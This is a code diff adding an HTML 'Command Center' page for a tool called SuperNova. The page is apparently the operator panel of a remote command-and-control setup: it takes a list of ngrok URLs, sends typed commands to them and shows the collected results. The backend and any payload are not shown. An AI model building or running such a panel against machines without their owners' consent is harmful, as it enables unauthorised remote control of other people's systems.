@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Center</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        body {
+            background-color: black; /* Terminal black background */
+            color: #ADD8E6; /* Terminal green text color */
+            font-family: 'Courier New', Courier, monospace; /* Monospace font for terminal feel */
+            padding: 20px;
+        }
+
+        input, button {
+            background-color: black; /* Input and button background */
+            color: #ADD8E6; /* Input and button text color */
+            border: 1px solid #ADD8E6; /* Border color */
+            padding: 5px;
+            font-family: 'Courier New', Courier, monospace; /* Same font */
+        }
+
+        input:focus, button:focus {
+            outline: none; /* Remove focus outline */
+        }
+
+        #output {
+            background-color: black; /* Output area background */
+            color: #ADD8E6; /* Output text color */
+            border: 1px solid #ADD8E6; /* Border color */
+            padding: 10px;
+            white-space: pre-wrap; /* Preserve whitespace */
+            max-height: 300px; /* Limit height */
+            overflow-y: auto; /* Enable vertical scrolling */
+        }
+
+        h1, h2 {
+            color: #ADD8E6; /* Heading color */
+        }
+
+        button {
+            cursor: pointer; /* Change cursor on hover */
+        }
+    </style>
+</head>
+<body>
+    <h1>SuperNova - V1.1</h1>
+    <a href="https://www.example.com" style="color: grey;">Made by VCRVIX and Wixp</a>
+    <h2>l </h2>
+    <h2>URL<h2>
+    <input type="text" id="ngrok-input" placeholder="Enter ngrok URLs separated by commas">
+    <button id="set-ngrok">Set URLs</button>
+
+    <h2>Send Command</h2>
+    <input type="text" id="command-input" placeholder="Enter command">
+    <button id="send-command">Send Command</button>
+
+    <h2>Output</h2>
+    <div id="output"></div>
+
+    <script>
+        $(document).ready(function() {
+            // Function to handle ngrok URL setting
+            function setNgrok() {
+                const urls = $('#ngrok-input').val();
+                $.post('/set_ngrok', { ngrok_urls: urls }, function(data) {
+                    $('#output').append(data.message + "\n");
+                    $('#output').scrollTop($('#output')[0].scrollHeight); // Auto scroll to bottom
+                });
+            }
+
+            // Function to handle command sending
+            function sendCommand() {
+                const command = $('#command-input').val();
+                $.post('/send_command', { command: command }, function(data) {
+                    $('#output').append(data.results.join("\n") + "\n");
+                    $('#output').scrollTop($('#output')[0].scrollHeight); // Auto scroll to bottom
+                });
+                $('#command-input').val(''); // Clear the command input field
+            }
+
+            // Click event for Set URLs button
+            $('#set-ngrok').click(setNgrok);
+
+            // Click event for Send Command button
+            $('#send-command').click(sendCommand);
+
+            // Keydown event for ngrok input
+            $('#ngrok-input').keydown(function(event) {
+                if (event.key === 'Enter') {
+                    event.preventDefault(); // Prevent form submission
+                    setNgrok(); // Call the setNgrok function
+                }
+            });
+
+            // Keydown event for command input
+            $('#command-input').keydown(function(event) {
+                if (event.key === 'Enter') {
+                    event.preventDefault(); // Prevent form submission
+                    sendCommand(); // Call the sendCommand function
+                }
+            });
+        });
+    </script>
+</body>
+</html>
